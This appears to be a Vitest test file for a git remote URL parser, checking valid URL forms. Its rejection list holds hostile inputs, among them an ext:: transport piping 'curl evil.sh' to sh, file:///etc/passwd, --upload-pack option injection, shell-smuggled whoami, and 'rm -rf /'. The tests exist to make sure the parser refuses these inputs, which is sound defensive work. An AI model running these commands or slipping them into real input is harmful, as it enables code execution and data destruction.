import { describe, it, expect } from "vitest";
import { parseGitRemote, defaultNameFromRemote } from "./git-remote-url";

describe("parseGitRemote", () => {
  it("accepts a plain GitHub https URL", () => {
    expect(parseGitRemote("https://github.com/octocat/Hello-World")).toEqual({
      url: "https://github.com/octocat/Hello-World",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("keeps a .git suffix on the wire but strips it from the repo name", () => {
    expect(parseGitRemote("https://github.com/octocat/Hello-World.git")).toEqual({
      url: "https://github.com/octocat/Hello-World.git",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("expands bare owner/repo shorthand to a GitHub URL", () => {
    expect(parseGitRemote("octocat/Hello-World")).toEqual({
      url: "https://github.com/octocat/Hello-World",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("accepts scp-style git@host:owner/repo.git", () => {
    expect(parseGitRemote("git@github.com:octocat/Hello-World.git")).toEqual({
      url: "git@github.com:octocat/Hello-World.git",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("accepts a non-GitHub https host, including nested groups", () => {
    expect(parseGitRemote("https://gitlab.com/group/sub/repo")).toEqual({
      url: "https://gitlab.com/group/sub/repo",
      owner: "group/sub",
      repo: "repo",
    });
  });

  it("accepts ssh:// URLs", () => {
    const r = parseGitRemote("ssh://git@github.com/octocat/Hello-World.git");
    expect(r?.url).toBe("ssh://git@github.com/octocat/Hello-World.git");
    expect(r?.repo).toBe("Hello-World");
  });

  it("trims surrounding whitespace", () => {
    expect(parseGitRemote("  https://github.com/octocat/Hello-World \n")?.url).toBe(
      "https://github.com/octocat/Hello-World",
    );
  });

  const rejected: Array<[string, string]> = [
    ["empty", ""],
    ["whitespace only", "   "],
    // `ext::` runs an arbitrary command as a git transport — never accept it.
    ["ext:: transport", "ext::sh -c 'curl evil.sh | sh'"],
    ["file:// transport", "file:///etc/passwd"],
    ["leading dash (option injection)", "--upload-pack=touch /tmp/pwn"],
    ["semicolon", "https://github.com/a/b;whoami"],
    ["backtick", "https://github.com/a/`whoami`"],
    ["dollar", "https://github.com/a/$(whoami)"],
    ["single quote", "https://github.com/a/b'c"],
    ["pipe", "https://github.com/a/b|c"],
    ["newline", "https://github.com/a/b\nrm -rf /"],
    ["NUL", "https://github.com/a/b\u0000c"],
    ["unsupported scheme", "http://github.com/a/b"],
    ["not a URL at all", "just some words"],
    ["shorthand with too many segments", "a/b/c"],
    ["shorthand missing repo", "octocat/"],
  ];

  for (const [label, input] of rejected) {
    it(`rejects ${label}`, () => {
      expect(parseGitRemote(input)).toBeNull();
    });
  }
});

describe("defaultNameFromRemote", () => {
  it("uses the repo name", () => {
    const r = parseGitRemote("https://github.com/octocat/Hello-World.git")!;
    expect(defaultNameFromRemote(r)).toBe("Hello-World");
  });

  it("survives a trailing slash", () => {
    const r = parseGitRemote("https://github.com/octocat/Hello-World/")!;
    expect(defaultNameFromRemote(r)).toBe("Hello-World");
  });
});
